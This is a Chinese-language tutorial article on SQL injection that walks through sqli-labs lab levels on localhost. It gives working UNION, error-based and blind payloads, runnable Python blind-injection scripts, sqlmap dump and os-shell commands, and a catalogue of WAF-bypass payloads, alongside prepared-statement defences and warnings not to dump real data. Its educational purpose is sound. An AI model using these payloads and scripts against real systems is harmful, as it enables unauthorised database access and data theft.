---
title: 第 4 篇：SQL 注入
layout: article
---
# 第 4 篇：SQL 注入——从 Less-1 到能自己写盲注脚本

SQL 注入是所有 Web 漏洞里最经典、也最容易被 SRC 收的一类。它的本质只有一句话：**用户输入被当成 SQL 代码拼进了查询语句**。

看懂这一篇，你需要先会一点 SQL：`SELECT`、`WHERE`、`UNION`、`ORDER BY`、`information_schema`。不会也没关系，下面会边打边解释。

---

## 一、先看一段有漏洞的代码

```php
$id = $_GET['id'];
$sql = "SELECT id, name, email FROM users WHERE id = $id";
$result = mysqli_query($conn, $sql);
```

正常请求 `?id=1`，SQL 是：

```sql
SELECT id, name, email FROM users WHERE id = 1
```

攻击者传 `?id=1' OR '1'='1`，SQL 变成：

```sql
SELECT id, name, email FROM users WHERE id = 1' OR '1'='1
```

`OR '1'='1'` 永远为真，条件失效，返回全表。这就是最朴素的注入。

### 注入点长什么样

| 位置 | 例子 | 注意 |
| --- | --- | --- |
| GET 参数 | `?id=1` | 最常见，直接改 URL |
| POST 表单 | `username=admin` | 用 Burp 改体 |
| JSON 体 | `{"id":1}` | sqlmap 要用 `*` 标记 |
| Cookie | `uid=1` | 有些系统拿 Cookie 查用户 |
| 请求头 | `X-Forwarded-For` | 被记录进数据库时可注入 |
| ORDER BY / LIMIT | `?sort=id` | 不能直接用 UNION，要另一套写法 |

---

## 二、SQL 注入的分类

| 类型 | 判断方式 | 利用方式 | 常见场景 |
| --- | --- | --- | --- |
| 联合查询（UNION） | 页面有回显 | 直接 `UNION SELECT` 把数据查出来 | 有查询结果展示 |
| 报错注入 | 页面报 SQL 错误 | `updatexml`/`extractvalue` 把数据带进报错 | 关闭了回显但没关报错 |
| 布尔盲注 | 页面只返回"正常/不正常" | 一位一位猜 | 无回显、无报错 |
| 时间盲注 | 页面无差异 | `sleep()` 看响应时间 | 完全盲打 |
| 堆叠注入 | 可以执行多条语句 | `; INSERT/UPDATE` | 部分数据库/驱动支持 |
| 二次注入 | 输入先存后查 | 存储时转义、取出时没转义 | 注册、改资料 |

---

## 三、sqli-labs Less-1：完整打一遍

先按第 2 篇把 sqli-labs 跑在 `http://127.0.0.1:8081`。Less-1 的源码大致是：

```php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

### 1. 找闭合方式

```text
http://127.0.0.1:8081/Less-1/?id=1
```

页面正常返回 `Your Login name:...`。加一个单引号：

```text
http://127.0.0.1:8081/Less-1/?id=1'
```

如果出现：

```text
You have an error in your SQL syntax; check the manual ...
```

说明单引号闭合成立。再试注释：

```text
http://127.0.0.1:8081/Less-1/?id=1' --+
```

`--+` 在 URL 里会被解码成 `-- `（`+` 是空格），MySQL 里 `-- ` 是行注释。页面恢复正常，确认注入点是 `'` 闭合 + `-- ` 注释。

**为什么用 `--+` 不直接用 `--`？** 因为 MySQL 的 `--` 后面必须跟一个空格（或控制字符）才算注释。URL 里直接写空格容易被截断，`+` 最稳。也可以写 `%23`（`#` 的编码），但 `#` 后面的内容不会发给服务端，要看具体位置。

### 2. 判断字段数

```text
http://127.0.0.1:8081/Less-1/?id=1' order by 3--+
```

正常；换成 `order by 4--+` 报错：

```text
Unknown column '4' in 'order clause'
```

说明查询结果有 3 列。

### 3. 联合查询找显示位

```text
http://127.0.0.1:8081/Less-1/?id=-1' union select 1,2,3--+
```

把 `id` 设成 `-1` 是为了让第一条查询查不到数据，页面只显示 UNION 的结果。页面上会出现 `2` 和 `3`，说明第 2、3 列会回显。

### 4. 查库名、版本、当前用户

```text
http://127.0.0.1:8081/Less-1/?id=-1' union select 1,database(),version()--+
```

```text
http://127.0.0.1:8081/Less-1/?id=-1' union select 1,user(),@@version_compile_os--+
```

输出类似：

```text
Your Login name: security
Your Password: 5.7.44
```

### 5. 查表名

```text
http://127.0.0.1:8081/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
```

输出：

```text
emails,referers,uagents,users
```

### 6. 查列名

```text
http://127.0.0.1:8081/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
```

输出：

```text
id,username,password
```

### 7. 取数据

```text
http://127.0.0.1:8081/Less-1/?id=-1' union select 1,username,password from users--+
```

`users` 表里是 MD5，拿到后可以离线破解。**在真实项目里，证明到表名/列名就停，不要拖用户数据。**

---

## 四、报错注入：没有回显也能把数据带出来

MySQL 的 `updatexml`、`extractvalue` 在参数不是合法 XML 时会把参数内容拼进报错。利用这个特性，可以把子查询结果带出来。

```text
http://127.0.0.1:8081/Less-1/?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
```

页面报错：

```text
XPATH syntax error: '~security~'
```

`0x7e` 是 `~`，用来做边界，方便从报错里提取。

查表名：

```text
http://127.0.0.1:8081/Less-1/?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+
```

如果报错信息被截断（`updatexml` 大约只显示 32 个字符），用 `substr` 分段：

```text
... updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,30),0x7e),1)--+
```

另一个函数：

```text
http://127.0.0.1:8081/Less-1/?id=1' and extractvalue(1,concat(0x7e,(select database()),0x7e))--+
```

**注意：** 报错注入依赖数据库版本和错误显示。MySQL 8.0 仍然能用 `updatexml`/`extractvalue`，但部分托管数据库会禁用；SQL Server、Oracle 的函数完全不同，别混用。

---

## 五、布尔盲注：写一个能跑的 Python 脚本

Less-8 没有回显、没有报错，但页面会根据条件返回不同内容。先手动确认：

```text
http://127.0.0.1:8081/Less-8/?id=1' and 1=1--+
http://127.0.0.1:8081/Less-8/?id=1' and 1=2--+
```

第一条返回 `You are in...`，第二条不返回。这个差异就是布尔条件。

### 逐位猜库名

```text
http://127.0.0.1:8081/Less-8/?id=1' and ascii(substr(database(),1,1))>100--+
```

`ascii('s') = 115`，所以 `>100` 为真，页面正常；`>120` 为假，页面空。用二分法 7 次左右就能确定一个字符。

完整脚本：

```python
import string
import requests

URL = "http://127.0.0.1:8081/Less-8/?id=1"
TRUE_MARK = "You are in"

def is_true(payload, timeout=10):
    r = requests.get(URL + payload, timeout=timeout)
    return TRUE_MARK in r.text

def get_char(pos):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        payload = f"' and ascii(substr(database(),{pos},1))>{mid}-- -"
        if is_true(payload):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo) if 32 <= lo <= 126 else ""

def get_string(length=20):
    result = ""
    for pos in range(1, length + 1):
        ch = get_char(pos)
        if not ch or ch == " ":
            break
        result += ch
        print(f"[+] {result}")
    return result

if __name__ == "__main__":
    print("database =", get_string())
```

输出：

```text
[+] s
[+] se
[+] sec
...
database = security
```

### 把脚本改成查表名

把 `get_char` 里的表达式换掉，并注意 `group_concat` 的结果可能很长，用 `limit` 逐行取：

```python
def get_table_char(pos, row=0):
    expr = ("select table_name from information_schema.tables "
            "where table_schema=database() limit %d,1" % row)
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        payload = f"' and ascii(substr(({expr}),{pos},1))>{mid}-- -"
        if is_true(payload):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo) if 32 <= lo <= 126 else ""
```

先猜长度，再逐位猜：

```text
' and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)>5-- -
```

**优化点：** 每次请求都新建连接很慢。真实项目里用 `requests.Session()` 复用连接，并加 `time.sleep(0.05)` 控制速率，别把目标打出告警。

---

## 六、时间盲注：页面完全没差异时

Less-9 无论条件真假都返回同一页面。这时用 `sleep()`：

```text
http://127.0.0.1:8081/Less-9/?id=1' and if(ascii(substr(database(),1,1))>100,sleep(3),0)--+
```

如果库名首字母 ASCII 大于 100，响应会延迟 3 秒；否则立即返回。

脚本：

```python
import time
import requests

URL = "http://127.0.0.1:8081/Less-9/?id=1"
DELAY = 3

def is_true(payload, timeout=15):
    start = time.time()
    try:
        requests.get(URL + payload, timeout=timeout)
    except requests.Timeout:
        return True
    return time.time() - start >= DELAY * 0.8

def get_char(pos):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        payload = (f"' and if(ascii(substr(database(),{pos},1))>{mid},"
                   f"sleep({DELAY}),0)-- -")
        if is_true(payload):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo) if 32 <= lo <= 126 else ""

if __name__ == "__main__":
    result = ""
    for i in range(1, 20):
        c = get_char(i)
        if not c:
            break
        result += c
        print(result)
```

**时间盲注的坑：**

- 网络抖动会让 `>= 3 秒` 误判，DELAY 设大一点（3～5 秒），并重复验证；
- 目标有缓存/CDN 时，第二次请求可能直接返回缓存，测不到延迟；
- 并发太高会让延迟叠加，反而判断不准。

---

## 七、sqlmap：验证和利用，不要拿它当扫描器

先手工确认注入点，再用 sqlmap 省时间。直接对一堆 URL 跑 sqlmap，既慢又容易被封。

### 基础用法

```bash
sqlmap -u "http://127.0.0.1:8081/Less-1/?id=1" --batch --dbs
```

- `--batch`：所有交互默认 yes，适合脚本；
- `--dbs`：列数据库；
- `--current-db`：当前库；
- `--current-user`：当前数据库用户；
- `--is-dba`：是否有 DBA 权限。

拿到库名后：

```bash
sqlmap -u "http://127.0.0.1:8081/Less-1/?id=1" -D security --tables
sqlmap -u "http://127.0.0.1:8081/Less-1/?id=1" -D security -T users --columns
sqlmap -u "http://127.0.0.1:8081/Less-1/?id=1" -D security -T users -C username,password --dump
```

### 用 Burp 保存的请求跑

把 Repeater 里的请求右键 **Copy to file**，存成 `request.txt`：

```http
POST /api/user HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json
Cookie: PHPSESSID=...

{"id":1}
```

```bash
sqlmap -r request.txt -p id --batch --dbs
```

JSON 参数要在值后面加 `*` 告诉 sqlmap 注入位置：

```json
{"id":1*}
```

或者：

```bash
sqlmap -u "http://127.0.0.1:8080/api/user" \
  --data '{"id":1*}' \
  --headers "Content-Type: application/json" \
  --batch --dbs
```

### 常用参数

| 参数 | 作用 | 注意 |
| --- | --- | --- |
| `--level=5 --risk=3` | 测试更多注入类型 | 风险高，可能写数据/拖慢业务，只在靶场用 |
| `--technique=BEUSTQ` | 指定技术：B 布尔、E 报错、U 联合、S 堆叠、T 时间、Q 内联 | 先 `U` 再 `B`，别一上来全开 |
| `--tamper=space2comment` | 绕过简单 WAF | 不是万能，需按 WAF 选 |
| `--delay=1` | 每次请求间隔 1 秒 | 控制速率 |
| `--threads=1` | 单线程 | 生产目标建议 1 |
| `--proxy=http://127.0.0.1:8080` | 走 Burp 看流量 | 方便调试 |
| `--flush-session` | 清掉上次缓存 | 换了参数/目标时用 |
| `--os-shell` | 尝试拿系统命令执行 | 需要 FILE 权限、目录可写，**只限靶场** |

**真实项目里的底线：** 只验证到 `--current-db`、`--tables` 就够写报告。不要 `--dump` 用户表，更不要 `--os-shell`。你多拖一条数据，性质就可能从"漏洞验证"变成"非法获取数据"。

---

## 八、WAF 绕过：先判断 WAF 类型，再谈绕过

WAF 绕过没有万能 payload。先确认拦的是什么：

- 请求直接被 403/406，页面是 WAF 的拦截页 → 关键词/规则拦截；
- 请求正常但参数被过滤 → 应用层过滤；
- 只有特定 payload 被拦 → 规则匹配特定模式。

### 常见手法

| 手法 | 示例 | 适用 |
| --- | --- | --- |
| 注释替换空格 | `union/**/select` | 拦空格的规则 |
| 换行/制表符 | `union%0aselect`、`union%09select` | 同上 |
| 大小写 | `UnIoN SeLeCt` | 规则区分大小写 |
| 版本注释 | `/*!50000union*/ /*!50000select*/` | MySQL 会执行注释内语句 |
| 逻辑符替换 | `and` → `&&`，`or` → 双竖线 | 拦关键字的规则 |
| 等号替换 | `=` → `like`、`in`、`between` | 拦 `=` 的规则 |
| 函数替换 | `substr` → `mid`，`ascii` → `ord` | 拦函数名的规则 |
| 双重编码 | `%2527` → `%27` → `'` | WAF 只解一次 |
| 参数污染 | `?id=1&id=1'` | WAF 取第一个、后端取最后一个 |
| 分块传输 | `Transfer-Encoding: chunked` | 部分 WAF 不解析分块体 |
| Content-Type 切换 | 表单改成 `application/json` | WAF 只检查表单 |

### 几个具体例子

```text
# 空格被拦
-1'/**/union/**/select/**/1,2,3--+

# union select 被拦
-1'/*!50000union*//*!50000select*/1,2,3--+

# and 被拦
-1'%26%26ascii(substr(database(),1,1))>100--+

# information_schema 被拦（MySQL 5.7+）
-1' union select 1,2,table_name from mysql.innodb_table_stats where database_name=database()--+

# 引号被拦，用十六进制
-1' union select 1,2,hex(database())--+
```

**验证是否真的绕过：** 不要只看页面是否 200。用布尔条件或时间延迟确认真被执行，比如 `and sleep(3)` 是否真的延迟。

### 一个容易忽略的点：WAF 只挡 URL

如果参数在 JSON 体、Cookie、请求头里，WAF 可能不检查。测试时把 payload 换到：

```http
Cookie: uid=1' and sleep(3)-- -
X-Forwarded-For: 1' and sleep(3)-- -
```

前提是这些值真的进了 SQL。很多系统会拿 `X-Forwarded-For` 写登录日志，日志表字段如果没转义，就存在注入。

---

## 九、代码怎么写才安全

### PHP PDO 预处理

```php
$stmt = $pdo->prepare('SELECT id, name, email FROM users WHERE id = ?');
$stmt->execute([$id]);
$rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
```

命名参数：

```php
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :name AND status = :status');
$stmt->execute([':name' => $username, ':status' => $status]);
```

**关键：** SQL 语句先编译，参数后绑定，参数永远不会被当成 SQL 代码。不要用字符串拼接，也不要用 `addslashes` 代替预处理——字符集、宽字节、二次注入都能绕过它。

### ORDER BY / LIMIT 不能绑定时用白名单

```php
$allowed = ['id', 'created_at', 'score'];
$sort = in_array($_GET['sort'], $allowed, true) ? $_GET['sort'] : 'id';
$order = $_GET['order'] === 'desc' ? 'DESC' : 'ASC';
$sql = "SELECT * FROM users ORDER BY $sort $order LIMIT 20";
```

只允许固定值，不要直接拼用户输入。

### 其他防线

- 数据库账号最小权限：业务账号只给 `SELECT/INSERT/UPDATE/DELETE`，不给 `FILE`、`DROP`；
- 关闭详细报错，统一错误页；
- 敏感数据加密存储，密码用 `password_hash`；
- WAF 只能当补充，不能替代代码修复；
- 定期用 sqlmap 对测试环境做回归。

---

## 十、SRC 里怎么找 SQL 注入

1. **先找参数**：URL、表单、JSON、Cookie、请求头，凡是进数据库的值都可能是注入点。
2. **用单引号/双引号/反斜杠试探**：`'`、`"`、`\`，看报错、状态码、响应长度变化。
3. **数字型参数别放过**：`id=1` 后面加 `and 1=1`、`and 1=2`，比引号更隐蔽。
4. **JSON 接口**：`{"id":1}` 改成 `{"id":"1'"}`，看是否报错；sqlmap 用 `*` 标记。
5. **二次注入**：注册用户名 `test'`，登录后看个人中心/订单页有没有报错；存储时转义、取出时没转义就会触发。
6. **ORDER BY 注入**：`?sort=id` 改成 `?sort=(select 1)`，看排序是否变化/报错。
7. **INSERT/UPDATE 注入**：注册、改资料、评论，输入带引号看是否 500。
8. **不要拖库**：证明能读 `database()` 或当前用户即可，报告里贴请求和响应，不贴用户数据。

### NoSQL 注入（顺手提一句）

MongoDB 登录接口如果直接把 JSON 传进查询：

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```

可能绕过登录。防御方法是强制类型转换、过滤 `$` 开头的键、禁用 `$where`。

---

## 十一、本篇自检清单

- [ ] 能解释 `' OR 1=1-- -` 为什么能让条件失效。
- [ ] sqli-labs Less-1 手工查到 `security` 库的 `users` 表字段。
- [ ] 能说出 UNION 注入的三个前提：列数相同、类型兼容、有回显。
- [ ] 用 Python 写出布尔盲注脚本，能猜出库名。
- [ ] 用时间盲注确认一个条件，知道为什么要重复验证。
- [ ] 会用 `sqlmap -r request.txt` 跑 Burp 保存的请求。
- [ ] 能说出至少 5 种 WAF 绕过手法，并知道要验证是否真执行。
- [ ] 能写出 PDO 预处理代码，知道 `addslashes` 为什么不够。
- [ ] 知道 SRC 报告里只证明到库名/表名，不拖用户数据。

---

**下一篇：[《XSS》](第5篇-XSS.md)**：SQL 注入打的是数据库，XSS 打的是浏览器。那篇从反射型、存储型、DOM 型三种分类讲起，把 XSS-labs 前 10 关的绕过逐关拆开，再做一个盗 Cookie 的本地实验，最后讲 CSP、HttpOnly 和输出编码怎么防。
